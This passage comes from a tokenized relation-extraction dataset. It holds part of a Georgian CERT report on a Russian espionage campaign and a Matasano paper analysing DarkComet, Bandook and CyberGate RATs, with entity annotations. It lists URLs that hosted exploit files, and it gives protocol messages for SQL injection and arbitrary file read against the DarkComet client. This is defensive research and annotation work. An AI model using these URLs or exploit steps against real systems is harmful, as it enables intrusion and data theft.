"\u201cProject", "Grey", "Goose\u201d"], ["Jefrey", "Carr", ",", "GreyLogic", "(cyber", "Intelligence", "services", "for", "Government", "Sector)"], ["Sanjay", "Goel", ",", "New", "York", "State", "Center", "for", "Information", "Forensics", "and", "Assurance"], ["Mike", "Himley", ",", "CEO/President", "of", "Eagle", "Intelligence"], ["They", "investigated", "entire", "Cyber", "Attack", "against", "Georgia", "and", "linked", "2008", "Cyber", "Attacks", "with", "so-called", "Cyber-Criminals", "Group"], ["\u201cRussian", "Business", "Network\u201d", ","], ["They", "had", "reported", ",", "that", "Some", "of", "used", "Internet", "Resources", "and", "Credentials", "belonged", "with", "\u201cRussian", "Ministry", "of", "Defense", "Research"], ["Institute\u201d", "called", "\u2013", "Center", "for", "Research", "of", "Military", "Strength", "of", "Foreign", "Countries", ".", "\u201d"], ["In", "2011-2012", ",", "During", "This", "New", "Cyber", "Espionage", "Attack", ",", "we", "have", "identified"], ["Russian", "Security", "agencies", ",", "once", "again", "."], ["18", "|", "P", "a", "g", "e"], ["We", "have", "found:", "3", "main", "facts", ",", "which", "indicate", "to", "Russian", "Official", "State", "organizations", "."], ["Warynews", ".", "ru", "\u2013", "site", "used", "to", "control", "infected", "Georgian", "computers", "\u2013", "IP", "and", "DNS", "servers"], ["belonges", "to", "Russian", "Business", "Network", ".", "(mentioned", "in", "various", "Blacklist", ",", "Bad", "Reputation)"], ["www", ".", "rbc.ru", "\u2013", "written", "directly", "into", "MALWARE", "code", ",", "to", "communicate", "with", "Attackers", "if", "every"], ["communication", "channel", "is", "closed", ".", "Official", "name", "\u201cRussian", "Business", "Consalting\u201d", "\u2013", "official"], ["website", ",", "linked", "with", "RBN", "."], ["http://legalcrf", ".", "in/f/4b178e605583cca28c850943e805aabc/1"], ["http://legalcrf", ".", "in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf", ".", "in/images/np/4b178e605583cca28c850943e805aabc.pdf"], ["http://legalcrf", ".", "in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf", ".", "in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf", ".", "in/images/t/4b178e605583cca28c850943e805aabc.html"], ["http://legalcrf", ".", "in/images/np/4b178e605583cca28c850943e805aabc.pdf"], ["http://legalcrf", ".", "in/images/4b178e605583cca28c850943e805aabc.jar"], ["http://legalcrf", ".", "in/f/4b178e605583cca28c850943e805aabc/3"], ["http://legalcrf", ".", "in/f/4b178e605583cca28c850943e805aabc/1"], ["19", "|", "P", "a", "g", "e"], ["Legalcrf", ".", "in", "\u2013Sending", "Malicious", "files", "through", "SPAM", "email", "FROM", "\u201cadmin@President", ".", "gov.ge\u201d."], ["Hosting", "Exploit", "Files"], ["Obscure", "Registrator", ",", "Only", "Discoverable", "by", "Indian", "WHOIS", "Service", ","], ["20", "|", "P", "a", "g", "e"], ["Lubianka", "13", ",", "Moscow", ".", "-", "Russian", "Ministry", "of", "Internal", "Affairs", ",", "Department", "of", "Logistics"], ["-", "Organization", "development", "and", "communications", "systems", ",", "improve", "information", "and"], ["communication", "technologies", "and", "technical", "protection", "of", "information;"], ["Next", "to", "it:", "Federal", "Security", "Service", "of", "the", "Russian", "Federation", "(FSB)", "\u2013", "Moscow"], ["In", "March", "2012", ",", "Company", "ESET", "Security", "Published", "Report", "named"], ["\u201cGeorbot:", "From", "Russia", "With", "Love\u201d", "(with", "support", "of", "our", "CERT", "Team)"], ["After", "That", "Russian", "NEWS", "Agencies", "Spread", "Disinformation", "Based", "on", "ESET\u2019s", "Report", "Blaming"], ["Georgian", "Governmental", "website", "(which", "actionly", "was", "hacked)", "for", "serving", "malicious", "files", ".", "But"], ["there", "where", "nothing", "said", "about", "REAL", "6", "Command", "&", "Controll", "Servers", "which", "were", "hosted", "in"], ["various", "countries", "and", "mentioned", "in", "ESET\u2019s", "Report", "."], ["21", "|", "P", "a", "g", "e"], ["We", "have", "Infected", "our", "PC", "from", "Lab", ",", "then", "gave", "Cyber", "Attacker", "Fake", "ZIP", "Archive", "with", "his", "own"], ["virus", "inside", "and", "the", "name", "\u201cGeorgian-Nato", "Agreement\u201d", "."], ["Attacker", "Stole", "that", "archive", "and", "executed", "malicious", "files", "."], ["As", "we", "had", "access", "to", "BOT", "Panel", ",", "we", "had", "maintained", "control", "over", "his", "PC", "."], ["Then", "captured", "got", "video", "of", "him", ",", "personally", ".", "We", "have", "captured", "process", "of", "creating", "new", "malicious"], ["modules", "."], ["We", "have", "Obtained", "Russian", "Document", ",", "from", "email", ",", "where", "he", "was", "giving", "someone", "instructions"], ["how", "to", "use", "this", "malicious", "software", "and", "how", "to", "infect", "targets", "."], ["We", "have", "linked", "him", "with", "some", "of", "German", "and", "Russian", "hackers", "."], ["Then", "we", "have", "Obtained", "information", "about", "his", "destination", "City", ",", "Internet", "Service", "Provider", ",", "Email"], ["and", "etc", "."], ["22", "|", "P", "a", "g", "e"], ["23", "|", "P", "a", "g", "e"], ["Disassembly", "Process", "in", "OllyDbg", "."], ["24", "|", "P", "a", "g", "e"], ["Nickname:", "ESHKINKOT", "\u2013", "Inside", "Malware", "Executable"], ["Same", "MAIL", "Address", ",", "City", "in", "Russia"], ["25", "|", "P", "a", "g", "e"], ["On", "Russian", "Xakep", "Forum", ",", "Seeking", "help", "for", "Exploit", "Development"], ["His", "Internet", "Service", "Provide", ",", "City"], ["26", "|", "P", "a", "g", "e"], ["Information", "About", "This", "Incident", "was", "Presented", "at", "Various", "Events", "&"], ["Conferences", "."], ["1)", "SSECI", "2012", "(Safety", ",", "Security", "and", "Efficiency", "of", "Critical", "Infrastructures)", "\u2013"], ["Prague", ",", "Czech", "Republic", "30", "may", "\u2013", "01", "June", "2012"], ["(with", "support", "of", "ONRG", "\u2013", "Office", "of", "Naval", "Research", "Global)"], ["2)", "Symposium", "on", "Cyber", "Incidents", "and", "Critical", "Infrastructure", "Protection", "\u2013"], ["Tallin", ",", "Estonia", "18-19", "June", "2012"], ["3)", "NATO", "\u2013", "Science", "for", "Peace", "and", "Security", "(SPS)", "-", "METU", "-", "Middle", "East", "Technical", "University"], ["Georgian", "Cyber", "Cases", "for", "Afghan", "IT", "Specialists", "Ankara", ",", "Turkey", "21", "May", "-", "01", "Jun", "2012"], ["27", "|", "P", "a", "g", "e"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Remote Administration Tools", "sent_id": 8, "pos": [0, 2]}, {"old_id": "T2", "type": "Exploit", "name": "keylogging", "sent_id": 36, "pos": [8]}, {"old_id": "T3", "type": "Malware", "name": "RATs", "sent_id": 36, "pos": [1]}, {"old_id": "T4", "type": "Exploit", "name": "screen and camera capture", "sent_id": 36, "pos": []}, {"old_id": "T5", "type": "Exploit", "name": "file management", "sent_id": 37, "pos": [2, 3]}, {"old_id": "T6", "type": "Exploit", "name": "registry management", "sent_id": 37, "pos": [13, 3]}, {"old_id": "T7", "type": "Exploit", "name": "code and script execution", "sent_id": 37, "pos": [5, 8]}, {"old_id": "T8", "type": "Exploit", "name": "power control", "sent_id": 37, "pos": [10, 11]}, {"old_id": "T9", "type": "Exploit", "name": "password sniffing", "sent_id": 38, "pos": [3, 4]}, {"old_id": "T10", "type": "Malware", "name": "DarkComet", "sent_id": 40, "pos": [9]}, {"old_id": "T11", "type": "Malware", "name": "Bandook", "sent_id": 41, "pos": [0]}, {"old_id": "T12", "type": "Malware", "name": "CyberGate", "sent_id": 41, "pos": [2]}, {"old_id": "T13", "type": "Malware", "name": "Xtreme RAT", "sent_id": 41, "pos": [4, 5]}, {"old_id": "T14", "type": "SourceCodeInformation", "name": "Delphi", "sent_id": 42, "pos": [9]}, {"old_id": "T15", "type": "MalwareCharacteristics", "name": "reverse-connecting", "sent_id": 50, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "RAT", "sent_id": 49, "pos": [1]}, {"old_id": "T17", "type": "Malware", "name": "DarkComet", "sent_id": 66, "pos": [0]}, {"old_id": "T18", "type": "Indicator", "name": "|", "sent_id": 72, "pos": []}, {"old_id": "T19", "type": "Exploit", "name": "SQL Injection", "sent_id": 103, "pos": [0, 1]}, {"old_id": "T20", "type": "Malware", "name": "DarkComet", "sent_id": 103, "pos": [3]}, {"old_id": "T21", "type": "Exploit", "name": "QuickUp", "sent_id": 121, "pos": []}, {"old_id": "T22", "type": "Malware", "name": "Bandook", "sent_id": 196, "pos": [0]}, {"old_id": "T23", "type": "MalwareCharacteristics", "name": "C++", "sent_id": 196, "pos": [7]}, {"old_id": "T24", "type": "MalwareCharacteristics", "name": "Delphi", "sent_id": 196, "pos": [9]}, {"old_id": "T25", "type": "MalwareCharacteristics", "name": "process injection", "sent_id": 197, "pos": [0, 1]}, {"old_id": "T26", "type": "MalwareCharacteristics", "name": "API unhooking", "sent_id": 197, "pos": [3, 4]}, {"old_id": "T27", "type": "MalwareCharacteristics", "name": "kernel patching", "sent_id": 197, "pos": [7, 8]}, {"old_id": "T28", "type": "Obfuscation", "name": "XORing against the constant 0xE9", "sent_id": 205, "pos": []}, {"old_id": "T29", "type": "Indicator", "name": "&&&", "sent_id": 207, "pos": []}, {"old_id": "T30", "type": "Software", "name": "TightVNC 1290", "sent_id": 209, "pos": []}, {"old_id": "T31", "type": "Malware", "name": "Bandook", "sent_id": 212, "pos": [5]}, {"old_id": "T32", "type": "Malware", "name": "CyberGate", "sent_id": 242, "pos": [1]}, {"old_id": "T33", "type": "MalwareCharacteristics", "name": "Delphi", "sent_id": 243, "pos": [6]}, {"old_id": "T34", "type": "Software", "name": "LordPE", "sent_id": 244, "pos": [7]}, {"old_id": "T35", "type": "Software", "name": "PEiD", "sent_id": 249, "pos": [1]}, {"old_id": "T36", "type": "Software", "name": "Detect It Easy", "sent_id": 249, "pos": [3, 5]}, {"old_id": "T37", "type": "Software", "name": "ProtectionID", "sent_id": 251, "pos": [0]}, {"old_id": "T38", "type": "Obfuscation", "name": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567 89+/", "sent_id": 261, "pos": []}, {"old_id": "T39", "type": "Obfuscation", "name": "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx yz+/", "sent_id": 264, "pos": []}, {"old_id": "T40", "type": "Indicator", "name": "###@@@", "sent_id": 269, "pos": []}, {"old_id": "T41", "type": "Indicator", "name": "njgnjvejvorenwtrnionrionvironvrnvcg210public", "sent_id": 275, "pos": [0]}, {"old_id": "T42", "type": "Malware", "name": "CyberGate", "sent_id": 285, "pos": [0]}, {"old_id": "T43", "type": "Malware", "name": "Xtreme RAT", "sent_id": 323, "pos": [0, 1]}, {"old_id": "T44", "type": "File", "name": "userinfo", "sent_id": 333, "pos": []}, {"old_id": "T45", "type": "MD5", "name": "a933d13f81649bebe035dc21f4002ff1", "sent_id": 337, "pos": []}, {"old_id": "T46", "type": "MD5", "name": "202cb962ac59075b964b07152d234b70", "sent_id": 339, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "\\x58\\x0d\\x0a", "sent_id": 403, "pos": []}, {"old_id": "T48", "type": "Malware", "name": "Xtreme RAT", "sent_id": 405, "pos": [0, 1]}], "labels": [{"old_id": "R1", "r": "P13", "h": 15, "t": 14, "evidence": [49, 50]}, {"old_id": "R2", "r": "P21", "h": 17, "t": 16, "evidence": []}, {"old_id": "R3", "r": "P13", "h": 21, "t": 22, "evidence": [196]}, {"old_id": "R4", "r": "P13", "h": 21, "t": 23, "evidence": [196]}, {"old_id": "R5", "r": "P13", "h": 21, "t": 24, "evidence": [196, 197]}, {"old_id": "R6", "r": "P13", "h": 21, "t": 25, "evidence": [196, 197]}, {"old_id": "R7", "r": "P13", "h": 21, "t": 26, "evidence": [196, 197]}, {"old_id": "R8", "r": "P21", "h": 28, "t": 30, "evidence": [207, 208, 209, 210, 211, 212]}, {"old_id": "R9", "r": "P13", "h": 31, "t": 32, "evidence": [242, 243]}, {"old_id": "R10", "r": "P21", "h": 39, "t": 41, "evidence": [269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285]}, {"old_id": "R11", "r": "P21", "h": 40, "t": 41, "evidence": [275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285]}, {"old_id": "R12", "r": "P21", "h": 43, "t": 42, "evidence": []}, {"old_id": "R13", "r": "P21", "h": 46, "t": 47, "evidence": [403, 404, 405]}], "title": ["inputs/txt/201210MatasanoRAT"], "sents": [["RESEARCH"], ["pest", "control:", "taming", "the", "rats"], ["Authors"], ["Shawn", "Denbow"], ["Twitter:", "@sdenbow_"], ["Email:", "denbos@rpi", ".", "edu"], ["Jesse", "Hertz"], ["Twitter:", "@hectohertz"], ["Remote", "Administration", "Tools", "(RATs)", "allow", "a"], ["remote", "attacker", "to", "control", "and", "access", "the"], ["system", ".", "In", "this", "paper", ",", "we", "present", "our", "analysis", "of"], ["their", "protocols", ",", "explain", "how", "to", "decrypt", "their"], ["traffic", ",", "as", "well", "as", "present", "vulnerabilities", "we", "have"], ["found", "."], ["Email:", "jhertz@brown", ".", "edu"], ["Introduction"], ["As", "2012", "Matasano", "summer", "interns", ",", "we", "were", "tasked", "with", "running", "a", "research"], ["project", "with", "a", "couple", "criteria:"], ["\u2022", "It", "should", "be", "something", "we", "are", "both", "interested", "in", "."], ["\u2022", "We", "should", "be", "able", "to", "present", "our", "research", "for", "the", "company", "at", "the", "end", "of"], ["our", "internship", ".", "However", ",", "on", "completion", ",", "we", "decided", "that", "it", "would", "be", "best", "if"], ["we", "made", "our", "findings", "public", "."], ["With", "John", "Villamil", ",", "our", "advisor", ",", "we", "decided", "that", "given", "our", "interest", "in", "low-level"], ["analysis", ",", "we", "should", "analyze", "Remote", "Administration", "Tools", "(RATs)", ".", "RATs", "have"], ["recent", "seen", "media", "attention", "RATs", "due", "to", "their", "use", "by", "oppressive", "governments"], ["in", "spying", "on", "activists", "and", "other", "\u201cdissidents\u201d", ".", "We", "felt", "this", "to", "be", "a", "perfect"], ["project", "."], ["Remote", "Administration", "Tools", "are", "pieces", "of", "software", "which", ",", "once", "installed", "on", "a"], ["victim\u2019s", "computer", "allow", "a", "remote", "user", "to", "control", "and", "access", "the", "system", ".", "RATs"], ["can", "be", "used", "legitimately", "by", "system", "administrators", ",", "or", "they", "can", "be", "used"], ["maliciously", "."], ["There", "are", "a", "variety", "of", "methods", "by", "which", "they", "are", "installed", "on", "a", "computer:"], ["Various", "social", "engineering", "tactics", "can", "be", "employed", "to", "get", "a", "user", "to", "open", "the"], ["executable", ",", "they", "can", "be", "bundled", "with", "other", "pieces", "of", "software", ",", "they", "can", "be"], ["installed", "as", "the", "payload", "of", "a", "virus", "or", "worm", ",", "or", "they", "can", "be", "installed", "after", "an"], ["attacker", "gains", "access", "to", "a", "system", "through", "an", "exploit", ".", "Most", "of", "the", "commonly"], ["available", "RATs", "are", "at", "least", "able", "to", "perform", "keylogging", ",", "screen", "and", "camera"], ["capture", ",", "file", "management", ",", "code", "and", "script", "execution", ",", "power", "control", ",", "registry"], ["management", ",", "and", "password", "sniffing", ".", "Wikipedia", "has", "a", "more", "complete", "list", "of"], ["common", "RAT", "functionality", "[1]", "."], ["Our", "research", "focused", "on", "analyzing", "several", "publicly", "available", "RATs:", "DarkComet", ","], ["Bandook", ",", "CyberGate", "and", "Xtreme", "RAT", ".", "Interestingly", ",", "all", "of", "the", "RATs", "we"], ["analyzed", "were", "coded", "either", "in", "part", "or", "entirely", "in", "Delphi", ".", "They", "all", "featured", "a"], ["reverse", "connecting", "architecture", ",", "as", "well", "as", "some", "form", "of", "cryptography", "or"], ["obfuscation", "of", "their", "communications", ".", "In", "this", "paper", ",", "we", "present", "our", "analysis", "of"], ["their", "protocols", ",", "explain", "how", "to", "decrypt", "their", "traffic", ",", "as", "well", "as", "present"], ["vulnerabilities", "we", "have", "found", ".", "The", "appendices", "to", "this", "paper", "contain", "MITM"], ["tools", "for", "decrypting", "traffic", ",", "as", "well", "as", "proof", "of", "concept", "exploits", "for", "the"], ["vulnerabilities", "we\u2019ve", "found", "."], ["Basic", "RAT", "Architecture"], ["Most", "RATs", "employ", "a", "\u201creverse-connecting\u201d", "architecture", "."], ["The", "\u201cclient\u201d", "program", ",", "resides", "on", "the", "attacker\u2019s", "machine", "and", "is", "used", "to", "control"], ["a", "compromised", "system", ".", "If", "often", "features", "a", "full", "UI", "designed", "for", "ease", "of", "use", "."], ["In", "contrast", ",", "the", "\u201cserver\u201d", "program", "is", "a", "much", "smaller", "stub", "which", "is", "installed", "on"], ["the", "compromised", "computer", ".", "These", "servers", "feature", "no", "UI", ",", "and", "take", "measures"], ["to", "disguise", "their", "presence", "."], ["On", "execution", ",", "the", "sever", "initiates", "a", "connection", "back", "to", "the", "client", "computer", ","], ["and", "remote", "control", "is", "then", "possible", ".", "The", "client", "program", "typically", "has", "the"], ["ability", "to", "generate", "server", "stubs", ",", "which", "have", "the", "IP", "address", "of", "the", "client", "(the"], ["command", "and", "control", "center)", "hard", "coded", "into", "them", "."], ["Some", "free", "versions", "of", "the", "RATs", "we", "investigated", "were", "feature", "limited", "to"], ["producing", "server", "stubs", "that", "were", "not", "stealthy", "or", "could", "only", "connect", "to"], ["localhost", ",", "with", "the", "ability", "to", "generate", "\u201cfull\u201d", "stubs", "only", "available", "on", "purchasing"], ["the", "paid", "version", ".", "Some", "servers", "had", "measures", "to", "defeat", "or", "disable", "antivirus"], ["and", "firewall", "software", "on", "the", "compromised", "machine", "."], ["The", "DarkComet", "RAT"], ["DarkComet", "is", "one", "of", "the", "most", "popular", "RATs", "in", "use", "today", ",", "gaining", "recent"], ["notoriety", "after", "its", "use", "by", "the", "Syrian", "government", "[13]", ".", "The", "encryption", "method"], ["used", "in", "DarkComet", "has", "already", "been", "extensively", "analyzed", "by", "various"], ["researchers", "[2]", "[3]", ",", "so", "we", "will", "not", "reiterate", "here", "."], ["We", "reverse", "engineered", "the", "DarkComet", "protocol", "and", "analyzed", "it", "for"], ["vulnerabilities", "."], ["After", "a", "quick", "look", "at", "its", "protocol", ",", "it", "is", "easy", "to", "see", "that", "it", "uses", "a", "\u201c|\u201d", "as", "it\u2019s"], ["delimiter", "between", "string", "parameters", ".", "Although", ",", "there", "is", "no", "delimiter", "between"], ["the", "command", "and", "the", "first", "parameter", "."], ["The", "DarkComet", "client", "stores", "information", "about", "servers", "in", "a", "SQLite", "database", ","], ["which", "is", "kept", "in", "the", "directory", "from", "which", "the", "client", "runs", ".", "This", "database", "also"], ["holds", "usernames", "and", "passwords", "for", "FTP", "servers", "to", "which", "the", "client", "has", "been"], ["configured", "to", "connect", ".", "When", "a", "new", "connection", "is", "established", ",", "a", "handshake"], ["occurs", "which", "looks", "like", "this:"], ["Notation"], ["C->S", "indicates", "a", "message", "from", "the", "Client", "to", "the", "Server"], ["S->C", "indicates", "a", "message", "from", "the", "Server", "to", "the", "Client"], ["(U)"], ["indicates", "the", "message", "is", "unencrypted"], ["DarkComet", "Handshake"], ["C->S:"], ["IDTYPE"], ["S->C:"], ["SERVER"], ["C->S:"], ["GetSIN172", ".", "16.1.1|769734"], ["S->C:"], ["infoesGuest16|172", ".", "16.1.1", "/", "[172", ".", "16.1.128]", ":", "1604|USER-3AA4AD4D2", "/"], ["Administrator|769734|0s|Windows", "XP", "Service", "Pack", "3", "[2600]", "32", "bit", "(", "C:\\", ")|x||"], ["US||{HW-ID}|43%|English", "(United", "States)", "US", "/"], ["5", ".", "3.0"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["--", "|6/13/2012", "at", "2:45:59", "PM|"], ["For", "testing", "purposes", ",", "we", "wrote", "our", "own", "\u201cserver\u201d", "which", "replied", "with", "the"], ["following", "shorter", "SIN", "(Server", "Info)", "string:"], ["infoesX|1|S|5|0s|W", "|x||US|I]|{7}|80%|E|6|5"], ["SQL", "Injection", "in", "DarkComet"], ["By", "attaching", "a", "debugger", "to", "the", "client", ",", "we", "were", "able", "to", "view", "the", "SQL", "strings", "it"], ["generated", "by", "the", "client", "to", "query", "its", "database", ".", "Upon", "connection", "with", "the"], ["above", "SIN", "string", ",", "the", "following", "SQL", "statement", "is", "executed:"], ["\"SELECT", "*", "FROM", "dc_users", "WHERE", "UUID=\"{7}\""], ["If", "that", "UUID", "is", "not", "in", "the", "database", ",", "the", "following", "statement", "is", "executed:"], ["\"INSERT", "INTO", "dc_users", "VALUES(", "\"{7}\"", ",", "\"1\"", ",", "\"S\"", ",", "\"W\"", ",", "\"0\")\""], ["If", "that", "UUID", "already", "exists", ",", "then", "the", "following", "statement", "is", "executed:"], ["\"UPDATE", "dc_users", "SET", "userIP=\"1\"", "WHERE", "UUID=\"{7}\"\""], ["There", "is", "no", "input", "validation", "or", "sanitization", ",", "so", "all", "of", "these", "SQL", "statements", "are"], ["injectable", "with", "the", "following", "caveats:"], ["\u2022", "Executing", "multiple", "commands", "in", "one", "statement", "with", "\u201c;\u201ds", "is", "disabled", ","], ["anything", "after", "a", "\u201c;\u201d", "will", "not", "be", "executed"], ["\u2022", "load_extension()", "is", "disabled"], ["These", "can", "be", "used", "to", "modify", "data", "in", "the", "database", ".", "We", "did", "not", "further"], ["develop", "these", "vulnerabilities", "to", "get", "information", "out", "of", "the", "database", ",", "as", "our"], ["next", "exploit", "made", "doing", "so", "unnecessary", "."], ["Arbitrary", "File", "Read", "from", "the", "Client\u2019s", "File", "System", "in", "DarkComet"], ["DarkComet", "uses", "a", "protocol", "that", "we", "have", "termed", "\u201cQuickUp\u201d", "in", "order", "to", "do"], ["ad-hoc", "uploading", "of", "files", ".", "For", "instance", ",", "the", "client", "has", "a", "feature", "which", "allows"], ["you", "to", "edit", "the", "compromised", "computers", "\u201chosts\u201d", "file", ".", "This", "is", "done", "by"], ["downloading", "the", "hosts", "file", "to", "the", "client", "computer", ",", "editing", "it", ",", "and", "then"], ["uploading", "it", "back", "to", "the", "server", ".", "The", "last", "part", "of", "that", "exchange", "uses", "the"], ["QuickUp", "protocol", ",", "and", "looks", "like", "this:"], ["DarkComet", "QuickUpload"], ["C->S:"], ["QUICKUPC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts", ".", "txt|752|HOSTS"], ["A", "new", "connection", "between", "the", "client", "and", "server", "is", "now", "established", "to"], ["handle", "the", "file", "transfer", ".", "The", "old", "connection", "is", "not", "closed", "first", ",", "the", "existing"], ["socket", "just", "has", "connect()", "called", "on", "it", "again"], ["C->S:"], ["IDTYPE"], ["S->C:"], ["QUICKUP752|C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts", ".", "txt|HOSTS"], ["C->S", "(U):"], ["\\x41\\x00\\x43"], ["C->S", "(U):"], ["LENGTH_OF_FILE_IN_BYTES"], ["S->C", "(U):"], ["A"], ["C->S", "(U):"], ["RAW_DATA_OF_SPECIFIED_FILE"], ["S->C", "(U):"], ["A"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Note", "that", "the", "protocol", "consists", "of", "two", "stages", ",", "the", "QUICKUP", "command", "issued"], ["from", "the", "client", ",", "which", "establishes", "a", "\u201cnew\u201d", "connection", ",", "and", "the", "QUICKUP"], ["command", "issued", "from", "the", "server", ",", "which", "begins", "the", "file", "transfer", ".", "Most"], ["importantly", ",", "after", "the", "new", "connection", "has", "been", "opened", ",", "the", "server", "requests"], ["the", "file", "to", "be", "uploaded", ".", "Three", "major", "weaknesses", "are", "present", "in", "this"], ["implementation:"], ["\u2022", "There", "is", "no", "check", "that", "the", "file", "in", "the", "client", "QUICKUP", "is", "the", "same", "as", "the", "file"], ["in", "the", "server", "QUICKUP"], ["\u2022", "The", "client", "responds", "to", "a", "QUICKUP", "commands", ",", "even", "if", "there", "was", "no"], ["corresponding", "QUICKUP", "from", "the", "client"], ["\u2022", "The", "client", "allows", "the", "server", "to", "specify", "the", "absolute", "path"], ["This", "flaw", "allows", "the", "retrieval", "of", "any", "file", "on", "the", "filesystem", "that", "it", "has"], ["permissions", "to", "read", ".", "So", "for", "instance", ",", "to", "get", "a", "dump", "of", "the", "SQLite", "database", ","], ["we", "can", "do", "the", "following:"], ["(1)", "Connect", "to", "the", "server", "and", "successfully", "complete", "the", "handshake"], ["(2)", "Open", "a", "new", "connection", "over", "our", "old", "one", ",", "the", "client", "will", "now", "reply:"], ["DarkComet", "SQLite", "DB", "Dump"], ["C->S:"], ["IDTYPE"], ["We", "now", "send", "a", "QUICKUP", "command", "unprompted"], ["S->C:"], ["QUICKUP111|comet", ".", "db|UPLOADEXEC"], ["C->S", "(U):"], ["\\x41\\x00\\x43"], ["S->C", "(U):"], ["A"], ["C->S", "(U):"], ["LENGTH_OF_FILE"], ["S->C", "(U):"], ["A"], ["C->S", "(U):"], ["RAW_DATA_OF_COMET", ".", "DB"], ["Any", "file", "in", "the", "DarkComet", "directory", "can", "be", "read", "this", "way", ".", "Alternatively", ","], ["absolute", "paths", "can", "be", "specified", ",", "allowing", "read", "access", "to", "any", "file", "on", "the", "client\u2019s"], ["filesystem", "(that", "DarkComet", "has", "permissions", "to", "access)", "."], ["Reading", "\u201cC:\\secret", ".", "txt\u201d", "from", "Client\u2019s", "File", "System"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Reading", "\u201cC:\\secret", ".", "txt\u201d", "from", "Client\u2019s", "File", "SystemOverall", ",", "this", "presents", "an", "issue"], ["for", "anyone", "using", "DarkComet", ".", "If", "a", "server", "sample", "is", "discovered", ",", "it", "is", "trivial", "to"], ["retrieve", "the", "key", "from", "the", "binary", "that", "is", "used", "in", "the", "network", "communication", "."], ["The", "key", "retrieval", "process", "can", "even", "be", "automated", "[4]", ".", "Recently", ",", "the", "developer"], ["of", "the", "RAT", "has", "quit", "any", "further", "development", "due", "to", "its", "misuse", ",", "therefore"], ["leaving", "this", "issue", "unpatched", "[12]", "."], ["For", "a", "stub", "server", "(written", "in", "python)", "that", "can", "exploit", "both", "of", "these"], ["vulnerabilities", ",", "see", "Appendix", "A", "."], ["The", "Bandook", "RAT"], ["Bandook", "is", "written", "in", "a", "mix", "of", "C++", "and", "Delphi", "[5]", "[6]", ".", "The", "server", "is", "able", "to", "use"], ["process", "injection", ",", "API", "unhooking", ",", "and", "kernel", "patching", "to", "bypass", "(some"], ["versions)", "of", "the", "Windows", "firewall", ".", "The", "server", "itself", "is", "fairly", "limited", "in"], ["functionality", ",", "but", "has", "the", "ability", "to", "be", "extended", "through", "a", "plugin", "architecture:"], ["the", "client", "can", "upload", "plugin", "code", "to", "the", "server", ".", "The", "client", "comes", "with", "several"], ["plugins", "which", "need", "to", "be", "installed", "on", "the", "server", "to", "enable", "full", "functionality", ".", "By"], ["default", ",", "the", "server", "attempts", "to", "hide", "itself", "by", "creating", "a", "process", "based", "on", "the"], ["default", "browser", "settings", "."], ["It", "lacks", "any", "real", "cryptography", "to", "protect", "its", "traffic", ".", "Instead", ",", "it", "obfuscates", "its"], ["traffic", "by", "XORing", "against", "the", "constant", "0xE9:"], ["XOR", "Loop", "with", "Constant"], ["Almost", "all", "messages", "are", "suffixed", "with", "\u201c&&&\u201d", "in", "cleartext:"], ["Server", "Keepalive", "with", "\u201c&&&\u201d"], ["The", "client", "comes", "bundled", "with", "TightVNC", "1", ".", "2.9.0,", "which", "has", "a", "publicly"], ["known", "security", "vulnerability", ".", "More", "information", "regarding", "the", "vulnerability"], ["and", "proof", "of", "concept", "code", "is", "available", "online", "[7]", "."], ["The", "latest", "public", "release", "of", "Bandook", "is", "v1", ".", "35,", "while", "the", "private", "version", "is"], ["at", "1", ".", "4.", "The", "public", "version", "was", "released", "April", "2007", ",", "which", "makes", "it", "quite"], ["old", "and", "outdated", ".", "It", "only", "supports", "up", "to", "Windows", "Vista", ",", "while", "the", "private"], ["version", "supports", "up", "to", "Win7", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Reverse", "Engineering", "The", "Bandook", "Protocol"], ["We", "will", "leave", "out", "the", "\u201c&&&\u201d", "cleartext", "suffix", "from", "our", "analysis", "."], ["Establishing", "a", "connection", "with", "the", "client", "is", "simple", ".", "The", "server", "will", "start", "by"], ["sending", "one", "command:"], ["Bandook", "Connection", "Initialization"], ["S", "->", "C:"], ["&first&", "#", "0d", "1h", "15m", "#", "Admin", "#"], ["#", "172", ".", "16.250.128"], ["/", "WhiteHouse"], ["#yes#yes#no#no#bndk13me#USA#no#yes#yes#"], ["So", "a", "\u201cfirst\u201d", "command", "is", "used", "to", "establish", "a", "connection", ".", "The", "fields", "separated"], ["by", "\u201c#\u201d", "correspond", "to", "info", "displayed", "in", "the", "client", ",", "such", "as", "IP", ",", "username", ","], ["uptime", ",", "and", "location", ".", "The", "fields", "marked", "yes/no", "correspond", "to", "whether", "the"], ["server", "has", "a", "given", "plugin", "or", "not", "."], ["The", "keepalive", "is", "as", "follows:"], ["Bandook", "Keepalive"], ["C", "->", "S:"], ["&BANG&"], ["S->", "C:"], ["&BAMG&"], ["To", "see", "the", "protocol", "for", "additional", "functionality", ",", "we", "recommend", "using", "the"], ["MITM", "decoder", "in", "Appendix", "B", ".", "To", "any", "researchers", "who", "are", "interested", "in"], ["further", "work", "on", "Bandook", ",", "we", "have", "a", "fairly", "detailed", "set", "of", "notes", "on", "the"], ["additional", "functionality", "protocols", ",", "which", "is", "available", "upon", "request", "."], ["The", "CyberGate", "RAT"], ["CyberGate", "is", "another", "RAT", "written", "in", "Delphi", ".", "It\u2019s", "also", "the", "only", "RAT", "we", "saw", "that"], ["featured", "protection", "against", "reverse", "engineering", ".", "Using", "LordPE", "to", "obtain", "a"], ["dump", ",", "you", "can", 